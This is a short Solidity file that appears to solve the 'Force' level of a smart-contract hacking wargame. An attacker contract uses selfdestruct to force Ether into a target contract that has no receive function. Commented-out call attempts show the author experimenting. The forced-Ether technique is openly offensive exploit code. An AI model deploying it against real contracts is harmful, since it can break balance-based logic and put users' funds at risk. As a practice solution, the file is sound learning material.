// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

 

*/
    function getbal() public view returns(uint256) {
        return address(this).balance;
    }
}

contract force2{
    Force f;
    function get() public returns(Force){
      f =  new Force();
      return f;
    }

    function send(address ff) public payable{

        // address(f).call{value:msg.value};
        // address(f).call.value(msg.value)("");
        //address(f).call.gas(50000).value(1 ether)("");
        //payable(msg.sender).call{value: 0.1 ether}
        // _receiver.call.value(msg.value).gas(20317)();


        (bool success, bytes memory result) = address(ff).call(abi.encodeWithSignature("", 1 ether, msg.sender)); // useless in this case
    }

    function destruct(address f2) public {

      address payable add =  payable(address(f2));
      selfdestruct(add); // trick to destruct address and make byte code zero asnd send all ether to specific address

    }


    receive() external payable{

    }
}